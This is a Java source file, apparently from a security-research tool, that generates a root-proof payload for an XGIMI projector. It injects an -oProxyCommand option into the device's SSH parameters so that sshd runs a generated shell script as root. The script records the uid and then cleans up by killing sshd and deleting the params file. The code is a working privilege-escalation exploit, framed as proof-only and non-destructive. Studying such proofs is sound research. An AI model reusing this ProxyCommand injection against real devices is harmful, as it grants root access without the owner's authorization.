package local.projector.returndiag;

/** Fixed proof-only payload. No input can supply a command, key or arbitrary path. */
final class RootPlan {
    static String directory(String run) {
        if (!run.matches("[a-f0-9]{32}")) throw new IllegalArgumentException("Invalid run id");
        return "/data/ssh/codex-probe-" + run;
    }
    static String params(String run) {
        return "-oBatchMode=yes -oConnectTimeout=75 -oConnectionAttempts=1 -oProxyCommand="
            + directory(run) + "/probe.sh 127.0.0.1";
    }
    static String script(String run) {
        String dir = directory(run);
        return "#!/system/bin/sh\n"
            + "umask 077\n"
            + "uid=$(/system/bin/id -u)\n"
            + "finish() {\n"
            + "  trap - 0 1 2 15\n"
            + "  /system/bin/setprop xgimi.remoteDebug.on false\n"
            + "  for attempt in 1 2 3; do\n"
            + "    /system/bin/killall sshd 2>/dev/null\n"
            + "    /system/bin/sleep 1\n"
            + "  done\n"
            + "  if [ \"$(/system/bin/cat /data/ssh/params 2>/dev/null)\" = '" + params(run) + "' ]; then\n"
            + "    /system/bin/rm /data/ssh/params\n"
            + "  fi\n"
            + "  printf '%s\\n' 'cleanup-ran=" + run + "' > " + dir + "/cleanup.txt\n"
            + "  /system/bin/chmod 644 " + dir + "/cleanup.txt\n"
            + "}\n"
            + "if [ \"$uid\" = 0 ]; then trap finish 0 1 2 15; fi\n"
            + "printf '%s\\n' 'run=" + run + "' \"uid=$uid\" > " + dir + "/proof.txt\n"
            + "/system/bin/chmod 644 " + dir + "/proof.txt\n"
            + "[ \"$uid\" = 0 ] || exit 40\n"
            + "exit 0\n";
    }
}
